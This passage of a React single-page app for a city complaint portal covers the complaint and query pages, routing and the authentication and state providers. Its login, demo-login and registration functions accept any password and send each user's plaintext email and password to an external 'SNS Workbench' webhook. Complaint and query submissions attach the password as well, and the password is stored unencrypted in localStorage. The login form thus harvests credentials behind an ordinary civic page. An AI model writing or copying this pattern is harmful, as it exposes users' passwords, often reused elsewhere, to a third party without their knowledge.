                <h3 className="text-xl font-extrabold text-[#123B63]">
                  Your complaint has been successfully submitted!
                </h3>
                <p className="mt-2 text-sm text-[#2EAD72] font-semibold">
                  Thank you for helping us make our city better.
                </p>
                {submittedInfo && (
                  <div className="my-5 p-3 rounded-xl bg-slate-50 border border-slate-200 text-left text-xs space-y-1.5">
                    <div className="flex justify-between">
                      <span className="text-slate-500 font-bold">Tracking ID:</span>
                      <span className="font-mono font-bold text-[#123B63]">{submittedInfo.id}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-500">Location:</span>
                      <span className="font-medium truncate max-w-[180px]">{submittedInfo.location}</span>
                    </div>
                  </div>
                )}
                <div className="flex gap-2">
                  <button
                    onClick={() => { setSuccessModal(false); navigate('/my-complaints'); }}
                    className="flex-1 py-2.5 rounded-xl text-xs font-bold text-white bg-[#123B63]"
                  >
                    View in My Complaints →
                  </button>
                  <button
                    onClick={() => setSuccessModal(false)}
                    className="px-4 py-2.5 rounded-xl text-xs font-bold text-slate-700 bg-slate-100"
                  >
                    Done
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Error Notice Modal (Preserves Form Data) */}
          {errorModal && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-fade-in">
              <div className="bg-white rounded-3xl shadow-2xl border border-slate-200 max-w-lg w-full p-6 sm:p-8 animate-scale-up text-xs">
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-10 h-10 rounded-xl bg-amber-500/10 text-amber-600 flex items-center justify-center">
                    <Icons.AlertCircle size={22} />
                  </div>
                  <div>
                    <h3 className="text-base font-bold text-slate-900">SNS Workbench Notice</h3>
                    <p className="text-slate-500">Your entered form data is safely preserved.</p>
                  </div>
                </div>

                <div className="p-3.5 rounded-xl bg-amber-50 border border-amber-200 text-amber-900 space-y-1.5 mb-4">
                  <p className="font-bold">Endpoint responded: HTTP {lastError?.status || 'Network Error'}</p>
                  <p className="font-mono text-[11px] bg-white/70 p-2 rounded border border-amber-200 break-all">
                    {lastError?.error || 'Webhook inactive or not found'}
                  </p>
                  <p className="text-slate-600">
                    If the n8n workflow on SNS Workbench is paused or awaiting manual trigger, you can save this complaint locally right now to view and track it.
                  </p>
                </div>

                <div className="space-y-2">
                  <button
                    onClick={handleSaveLocalFallback}
                    className="w-full py-2.5 rounded-xl text-xs font-bold bg-[#2EAD72] text-white shadow-sm"
                  >
                    Save to My Complaints Ledger & View Status →
                  </button>
                  <button
                    onClick={() => { setErrorModal(false); onOpenApiModal(); }}
                    className="w-full py-2.5 rounded-xl text-xs font-bold bg-slate-100 text-slate-700 border border-slate-200"
                  >
                    Configure Webhook Settings
                  </button>
                  <button
                    onClick={() => setErrorModal(false)}
                    className="w-full py-1 text-slate-500 hover:text-slate-800"
                  >
                    Continue Editing Form
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    // --- Page 5: My Complaints Page (Section 7) ---
    function MyComplaintsPage({ navigate }) {
      const { complaints } = useContext(ComplaintContext);
      const [filter, setFilter] = useState('All');
      const [search, setSearch] = useState('');
      const [modalImage, setModalImage] = useState(null);

      const statuses = ['All', 'Submitted', 'Under Review', 'In Progress', 'Resolved'];

      const filtered = complaints.filter(c => {
        const matchesStatus = filter === 'All' || c.status === filter;
        const q = search.toLowerCase().trim();
        const matchesSearch = !q || c.id.toLowerCase().includes(q) || c.complaint.toLowerCase().includes(q) || c.location.toLowerCase().includes(q);
        return matchesStatus && matchesSearch;
      });

      return (
        <div className="min-h-screen bg-[#F5F7FA] py-10 px-4 sm:px-6 lg:px-8">
          <div className="max-w-7xl mx-auto space-y-6">
            {/* Header */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-slate-200 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <div>
                <h1 className="text-2xl sm:text-3xl font-extrabold text-[#123B63]">My Submitted Complaints</h1>
                <p className="text-xs text-slate-500 mt-1">
                  Track real-time resolution status across all reported municipal grievances.
                </p>
              </div>
              <button
                onClick={() => navigate('/complaint')}
                className="px-5 py-2.5 rounded-xl text-xs font-bold bg-[#123B63] hover:bg-[#0d2b4a] text-white flex items-center gap-1.5 shrink-0"
              >
                <Icons.Plus size={16} className="text-[#2496D8]" />
                <span>New Complaint</span>
              </button>
            </div>

            {/* Filters & Search */}
            <div className="bg-white p-4 rounded-2xl border border-slate-200 flex flex-col md:flex-row gap-4 justify-between items-center text-xs">
              <div className="flex gap-1.5 overflow-x-auto w-full md:w-auto pb-1 md:pb-0">
                {statuses.map(st => (
                  <button
                    key={st}
                    onClick={() => setFilter(st)}
                    className={`px-3.5 py-1.5 rounded-xl font-bold transition-all ${
                      filter === st ? 'bg-[#123B63] text-white shadow-xs' : 'bg-slate-50 text-slate-600 border border-slate-200'
                    }`}
                  >
                    {st}
                  </button>
                ))}
              </div>

              <div className="relative w-full md:w-72">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">
                  <Icons.Search size={15} />
                </div>
                <input
                  type="text"
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  placeholder="Search by ID or description..."
                  className="w-full pl-9 pr-3.5 py-1.5 rounded-xl border border-slate-300 text-xs bg-slate-50 focus:bg-white"
                />
              </div>
            </div>

            {/* List */}
            {filtered.length === 0 ? (
              <div className="bg-white p-12 rounded-3xl border border-slate-200 text-center max-w-md mx-auto">
                <Icons.FileText size={36} className="mx-auto mb-2 text-slate-300" />
                <h3 className="font-bold text-slate-800 text-sm">No Complaints Found</h3>
                <p className="text-xs text-slate-500 mt-1">Try resetting your search or submit a new grievance.</p>
                <button
                  onClick={() => navigate('/complaint')}
                  className="mt-4 px-4 py-2 rounded-xl text-xs font-bold text-white bg-[#123B63]"
                >
                  Register a Complaint →
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-1 gap-4">
                {filtered.map(item => (
                  <div key={item.id} className="bg-white rounded-3xl border border-slate-200 shadow-sm p-5 sm:p-6 space-y-4">
                    <div className="flex flex-col sm:flex-row justify-between sm:items-center gap-2 pb-3 border-b border-slate-100">
                      <div className="flex items-center gap-2.5 flex-wrap">
                        <span className="font-mono text-xs font-bold text-[#123B63] bg-slate-100 px-2.5 py-0.5 rounded-lg border border-slate-200">
                          {item.id}
                        </span>
                        <StatusBadge status={item.status} isMock={item.is_mock} />
                        {item.category && <span className="text-xs text-slate-500 bg-slate-50 px-2 py-0.5 rounded">{item.category}</span>}
                      </div>
                      <span className="text-xs text-slate-400">
                        {new Date(item.submitted_at).toLocaleDateString()}
                      </span>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
                      <div className="md:col-span-2 space-y-3">
                        <p className="text-sm font-semibold text-slate-800 leading-relaxed whitespace-pre-wrap">{item.complaint}</p>
                        <p className="text-xs text-slate-500 flex items-center gap-1.5">
                          <Icons.MapPin size={14} className="text-[#2496D8] shrink-0" />
                          <span>{item.location}</span>
                        </p>
                        {item.queries_and_requests && (
                          <div className="p-2.5 rounded-xl bg-sky-50 text-xs text-slate-700">
                            <span className="font-bold text-sky-800 block mb-0.5">Queries / Requests:</span>
                            {item.queries_and_requests}
                          </div>
                        )}
                      </div>

                      <div className="border-t md:border-t-0 md:border-l border-slate-100 pt-3 md:pt-0 md:pl-5 space-y-3 flex flex-col justify-between text-xs">
                        {item.image ? (
                          <div onClick={() => setModalImage(item.image)} className="cursor-pointer group relative rounded-xl overflow-hidden border border-slate-200 max-h-32 bg-slate-900">
                            <img src={item.image} alt="Evidence" className="w-full h-full object-cover group-hover:scale-105 transition-transform" />
                            <div className="absolute inset-0 bg-slate-900/40 opacity-0 group-hover:opacity-100 flex items-center justify-center text-white font-bold gap-1 text-[11px]">
                              <Icons.ExternalLink size={13} />
                              <span>Enlarge Photo</span>
                            </div>
                          </div>
                        ) : (
                          <div className="p-3 rounded-xl bg-slate-50 text-center text-slate-400">
                            <span>No photo attached</span>
                          </div>
                        )}

                        <div className="p-2.5 rounded-xl bg-slate-50 text-[11px] text-slate-600 space-y-1">
                          <div className="flex justify-between">
                            <span>Division:</span>
                            <span className="font-bold text-slate-800 truncate max-w-[130px]">{item.assigned_dept || 'Municipal Works'}</span>
                          </div>
                          <div className="flex justify-between">
                            <span>Officer:</span>
                            <span className="font-bold text-slate-800 truncate max-w-[130px]">{item.officer || 'Field Squad'}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Lightbox Modal */}
          {modalImage && (
            <div onClick={() => setModalImage(null)} className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-fade-in">
              <div className="relative max-w-3xl max-h-[85vh] bg-slate-900 rounded-2xl overflow-hidden p-2">
                <img src={modalImage} alt="Full resolution evidence" className="max-h-[80vh] w-auto object-contain rounded-lg" />
              </div>
            </div>
          )}
        </div>
      );
    }

    // --- Page 6: Queries & Requests Page (Section 8) ---
    function QueriesPage({ navigate }) {
      const { user } = useContext(AuthContext);
      const { queries, submitQuery } = useContext(ComplaintContext);
      const { addToast } = useContext(NotificationContext);

      const [title, setTitle] = useState('');
      const [category, setCategory] = useState('Water Supply & Sewerage');
      const [desc, setDesc] = useState('');
      const [submitting, setSubmitting] = useState(false);

      const handleSubmit = async (e) => {
        e.preventDefault();
        if (!title.trim() || !desc.trim()) {
          addToast({ title: 'Incomplete Query', message: 'Subject and description are required.', type: 'warning' });
          return;
        }

        setSubmitting(true);
        await submitQuery({
          title,
          category,
          description: desc,
          citizenName: user?.name || 'Citizen User',
          citizenEmail: user?.email || 'citizen@fixmycity.org'
        });
        setSubmitting(false);

        addToast({ title: 'Query Logged', message: 'Dispatched to ward desk via SNS Workbench.', type: 'success' });
        setTitle('');
        setDesc('');
      };

      return (
        <div className="min-h-screen bg-[#F5F7FA] py-10 px-4 sm:px-6 lg:px-8">
          <div className="max-w-4xl mx-auto space-y-8">
            <div className="bg-gradient-to-r from-[#123B63] to-[#2496D8] text-white p-6 sm:p-8 rounded-3xl shadow-lg">
              <h1 className="text-2xl sm:text-3xl font-extrabold tracking-tight">Queries & Assistance Requests</h1>
              <p className="mt-1 text-xs sm:text-sm text-slate-100">
                Ask questions regarding municipal services, request civic assistance, or propose locality ideas.
              </p>
            </div>

            {/* Submission Form */}
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-slate-200 shadow-sm">
              <h2 className="text-base font-bold text-[#123B63] mb-4">Submit a Query or Assistance Request</h2>
              <form onSubmit={handleSubmit} className="space-y-4 text-xs">
                <div>
                  <label className="block font-bold uppercase text-slate-700 mb-1">Subject / Question *</label>
                  <input
                    type="text"
                    value={title}
                    onChange={(e) => setTitle(e.target.value)}
                    placeholder="e.g. Drinking water supply schedule for Ward 14"
                    className="w-full px-3.5 py-2.5 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#2496D8]"
                    required
                  />
                </div>

                <div>
                  <label className="block font-bold uppercase text-slate-700 mb-1">Department Category</label>
                  <select
                    value={category}
                    onChange={(e) => setCategory(e.target.value)}
                    className="w-full px-3.5 py-2.5 rounded-xl border border-slate-300 text-sm bg-slate-50"
                  >
                    <option value="Water Supply & Sewerage">Water Supply & Sewerage</option>
                    <option value="Street Lighting & Power">Street Lighting & Power</option>
                    <option value="Sanitation & Garbage Disposal">Sanitation & Garbage Disposal</option>
                    <option value="Parks & Recreation">Parks & Recreation</option>
                    <option value="Civic Policy Suggestion">Civic Policy Suggestion</option>
                  </select>
                </div>

                <div>
                  <label className="block font-bold uppercase text-slate-700 mb-1">Detailed Message *</label>
                  <textarea
                    rows={4}
                    value={desc}
                    onChange={(e) => setDesc(e.target.value)}
                    placeholder="Explain your query or assistance request in detail..."
                    className="w-full p-3.5 rounded-xl border border-slate-300 text-sm focus:ring-2 focus:ring-[#2496D8]"
                    required
                  />
                </div>

                <div className="pt-2 flex justify-end">
                  <button
                    type="submit"
                    disabled={submitting}
                    className="px-6 py-2.5 rounded-xl text-xs font-bold text-white bg-[#123B63] hover:bg-[#0d2b4a] shadow-sm flex items-center gap-1.5"
                  >
                    <Icons.Send size={14} />
                    <span>{submitting ? 'Sending...' : 'Dispatch Query'}</span>
                  </button>
                </div>
              </form>
            </div>

            {/* List of Previous Queries */}
            <div className="space-y-4">
              <h3 className="text-base font-bold text-[#123B63]">Submitted Queries & Municipal Responses</h3>
              {queries.map(q => (
                <div key={q.id} className="bg-white rounded-2xl p-5 border border-slate-200 shadow-xs space-y-2.5 text-xs">
                  <div className="flex justify-between items-start">
                    <div>
                      <div className="flex items-center gap-2 mb-1">
                        <span className="font-mono font-bold text-[#123B63]">{q.id}</span>
                        <span className="px-2 py-0.5 rounded bg-emerald-50 text-emerald-700 font-bold border border-emerald-200">{q.status}</span>
                        <span className="text-slate-400">• {q.category}</span>
                      </div>
                      <h4 className="font-bold text-slate-900 text-sm">{q.title}</h4>
                    </div>
                    <span className="text-slate-400">{new Date(q.submitted_at).toLocaleDateString()}</span>
                  </div>
                  <p className="text-slate-600 bg-slate-50 p-2.5 rounded-xl border border-slate-100">"{q.description}"</p>
                  {q.response && (
                    <div className="p-3 rounded-xl bg-sky-50 border border-sky-100">
                      <span className="font-bold text-[#123B63] block mb-0.5">Response ({q.answered_by}):</span>
                      <p className="text-slate-700 leading-relaxed">{q.response}</p>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>
      );
    }

    // --- Main App Component with Hash Router ---
    function App() {
      const { user, isLoggedIn } = useContext(AuthContext);
      const [currentPath, setCurrentPath] = useState(() => {
        const h = window.location.hash.replace('#', '') || '/login';
        return h.startsWith('/') ? h : `/${h}`;
      });
      const [apiModalOpen, setApiModalOpen] = useState(false);

      useEffect(() => {
        const onHash = () => {
          const h = window.location.hash.replace('#', '') || '/login';
          setCurrentPath(h.startsWith('/') ? h : `/${h}`);
          window.scrollTo(0, 0);
        };
        window.addEventListener('hashchange', onHash);
        if (!window.location.hash) {
          window.location.hash = isLoggedIn ? '#/home' : '#/login';
        }
        return () => window.removeEventListener('hashchange', onHash);
      }, [isLoggedIn]);

      const navigate = (p) => {
        window.location.hash = `#${p}`;
        setCurrentPath(p);
        window.scrollTo(0, 0);
      };

      const isAuth = currentPath === '/login' || currentPath === '/register';

      const renderView = () => {
        switch (currentPath) {
          case '/login': return <LoginPage navigate={navigate} />;
          case '/register': return <RegisterPage navigate={navigate} />;
          case '/home': return <DashboardPage navigate={navigate} />;
          case '/complaint': return <ComplaintPage navigate={navigate} onOpenApiModal={() => setApiModalOpen(true)} />;
          case '/my-complaints': return <MyComplaintsPage navigate={navigate} />;
          case '/queries': return <QueriesPage navigate={navigate} />;
          case '/profile': return <ProfilePage navigate={navigate} />;
          default: return <DashboardPage navigate={navigate} />;
        }
      };

      return (
        <div className="min-h-screen flex flex-col bg-[#F5F7FA]">
          <ToastContainer />

          {!isAuth && (
            <Navbar currentPath={currentPath} navigate={navigate} onOpenApiModal={() => setApiModalOpen(true)} />
          )}

          <main className="flex-1">
            {renderView()}
          </main>

          {!isAuth && (
            <Footer navigate={navigate} onOpenApiModal={() => setApiModalOpen(true)} />
          )}

          <ApiSettingsModal isOpen={apiModalOpen} onClose={() => setApiModalOpen(false)} />
        </div>
      );
    }

    // --- Application Root Providers Wrapper ---
    function Root() {
      // Auth State
      const [user, setUser] = useState(() => {
        try {
          const s = localStorage.getItem('fmc_citizen_user');
          if (s) return JSON.parse(s);
        } catch (e) {}
        return null;
      });
      const [loading, setLoading] = useState(false);

      const login = async (email, password, remember = true) => {
        setLoading(true);
        const cleanEmail = email.trim().toLowerCase();
        const cleanPassword = password || '';

        const u = {
          name: email.split('@')[0].replace(/[\._]/g, ' ').replace(/\b\w/g, c => c.toUpperCase()),
          email: cleanEmail,
          password: cleanPassword,
          location: 'Ward 14, 42 MG Road, Central District',
          phone: '+91 98450 12345',
          avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80',
          ward: 'Ward 14 (Central)',
          joinedDate: '2026',
          isLoggedIn: true
        };

        // Forward Email ID and Password to SNS Workbench Webhook as "login"
        try {
          await sendAuthCredentialsToWebhook({
            email: cleanEmail,
            password: cleanPassword,
            isNewAccount: false,
            action: 'login',
            name: u.name,
            location: u.location
          });
        } catch (err) {
          console.log('Webhook login dispatch notice:', err);
        }

        setUser(u);
        if (remember) localStorage.setItem('fmc_citizen_user', JSON.stringify(u));
        setLoading(false);
        return u;
      };

      const loginDemo = async () => {
        setLoading(true);
        const demo = {
          name: 'Alex Morgan',
          email: 'alex.morgan@fixmycity.org',
          password: 'Password@123',
          location: 'Ward 14, 42 MG Road, Central District',
          phone: '+91 98450 12345',
          avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80',
          ward: 'Ward 14 (Central)',
          joinedDate: '2026',
          isLoggedIn: true
        };

        // Forward Demo Email ID and Password to SNS Workbench Webhook as "login"
        try {
          await sendAuthCredentialsToWebhook({
            email: demo.email,
            password: demo.password,
            isNewAccount: false,
            action: 'login',
            name: demo.name,
            location: demo.location
          });
        } catch (err) {
          console.log('Webhook demo login dispatch notice:', err);
        }

        setUser(demo);
        localStorage.setItem('fmc_citizen_user', JSON.stringify(demo));
        setLoading(false);
        return demo;
      };

      const register = async (f) => {
        setLoading(true);
        const cleanEmail = f.email.trim().toLowerCase();
        const cleanPassword = f.password || '';

        const nu = {
          name: f.name.trim(),
          email: cleanEmail,
          password: cleanPassword,
          location: f.location?.trim() || 'Ward 14, Central District',
          phone: '+91 98450 12345',
          avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=200&q=80',
          ward: 'Ward 14',
          joinedDate: '2026',
          isLoggedIn: true
        };

        // Forward Registered Email ID and Password to SNS Workbench Webhook as "new account"
        try {
          await sendAuthCredentialsToWebhook({
            email: cleanEmail,
            password: cleanPassword,
            isNewAccount: true,
            action: 'new account',
            name: nu.name,
            location: nu.location
          });
        } catch (err) {
          console.log('Webhook registration dispatch notice:', err);
        }

        setUser(nu);
        localStorage.setItem('fmc_citizen_user', JSON.stringify(nu));
        setLoading(false);
        return nu;
      };

      const logout = () => {
        setUser(null);
        localStorage.removeItem('fmc_citizen_user');
      };

      const updateProfile = (up) => {
        setUser(prev => {
          const n = { ...prev, ...up };
          localStorage.setItem('fmc_citizen_user', JSON.stringify(n));
          return n;
        });
      };

      // Toasts State
      const [toasts, setToasts] = useState([]);
      const removeToast = useCallback((id) => {
        setToasts(prev => prev.filter(t => t.id !== id));
      }, []);
      const addToast = useCallback(({ title, message, type = 'info', duration = 4500 }) => {
        const id = Date.now() + Math.random().toString(36).substring(2, 7);
        setToasts(prev => [...prev, { id, title, message, type, duration }]);
        if (duration > 0) setTimeout(() => removeToast(id), duration);
      }, [removeToast]);

      // Complaints State
      const [complaints, setComplaints] = useState(() => {
        try {
          const s = localStorage.getItem('fmc_stored_complaints');
          if (s) return JSON.parse(s);
        } catch (e) {}
        return MOCK_COMPLAINTS;
      });

      const [queries, setQueries] = useState(() => {
        try {
          const s = localStorage.getItem('fmc_stored_queries');
          if (s) return JSON.parse(s);
        } catch (e) {}
        return MOCK_QUERIES;
      });

      const [submitting, setSubmitting] = useState(false);

      useEffect(() => {
        try { localStorage.setItem('fmc_stored_complaints', JSON.stringify(complaints)); } catch (e) {}
      }, [complaints]);

      useEffect(() => {
        try { localStorage.setItem('fmc_stored_queries', JSON.stringify(queries)); } catch (e) {}
      }, [queries]);

      // Submit complaint to SNS Workbench Webhook (Includes Email ID and Password)
      const submitComplaint = async (formData, forceLocal = false) => {
        setSubmitting(true);
        const id = `FMC-${new Date().getFullYear()}-${Math.floor(1000 + Math.random() * 9000)}`;

        const payload = {
          name: formData.name?.trim() || '',
          location: formData.location?.trim() || '',
          email: formData.email?.trim().toLowerCase() || user?.email || '',
          password: user?.password || formData.password || 'CitizenPassword@123',
          image: formData.image ? formData.image : null,
          complaint: formData.complaint?.trim() || '',
          queries_and_requests: formData.queries_and_requests?.trim() || null,
          category: formData.category || 'General Civic Issue',
          action: 'complaint_submission',
          submitted_at: new Date().toISOString()
        };

        const apiResult = await sendComplaintToWebhook(payload);

        const newRec = {
          id,
          name: payload.name,
          email: payload.email,
          location: payload.location,
          complaint: payload.complaint,
          queries_and_requests: payload.queries_and_requests,
          category: formData.category || 'General Civic Issue',
          image: payload.image,
          status: 'Submitted',
          submitted_at: payload.submitted_at,
          assigned_dept: 'Civic Grievance Redressal Cell',
          officer: 'SNS Workbench Automated Dispatch',
          is_mock: false
        };

        if (apiResult.success || forceLocal) {
          setComplaints(prev => [newRec, ...prev]);
        }

        setSubmitting(false);
        return { success: apiResult.success, complaint: newRec, apiResult };
      };

      const submitQuery = async ({ title, category, description, citizenName, citizenEmail }) => {
        const id = `QRY-${new Date().getFullYear()}-${Math.floor(100 + Math.random() * 900)}`;
        const payload = {
          name: citizenName,
          location: 'Ward Inquiry Desk',
          email: citizenEmail || user?.email || '',
          password: user?.password || 'CitizenPassword@123',
          image: null,
          complaint: `[CIVIC QUERY]: ${title} - ${description}`,
          queries_and_requests: description,
          action: 'query_submission',
          submitted_at: new Date().toISOString()
        };
        sendComplaintToWebhook(payload).catch(e => console.log('Query webhook ping:', e));

        const nq = {
          id,
          title,
          category,
          status: 'Under Review',
          description,
          response: 'Your query has been logged and forwarded to municipal public relations desk.',
          submitted_at: new Date().toISOString(),
          answered_by: 'Pending Ward Officer Assignment'
        };
        setQueries(prev => [nq, ...prev]);
        return nq;
      };

      return (
        <AuthContext.Provider value={{ user, isLoggedIn: !!user, loading, login, loginDemo, register, logout, updateProfile }}>
          <NotificationContext.Provider value={{ toasts, addToast, removeToast }}>
            <ComplaintContext.Provider value={{ complaints, queries, submitting, submitComplaint, submitQuery }}>
              <App />
            </ComplaintContext.Provider>
          </NotificationContext.Provider>
        </AuthContext.Provider>
      );
    }

    // Render React Application
    const root = ReactDOM.createRoot(document.getElementById('root'));
    root.render(<Root />);
  </script>
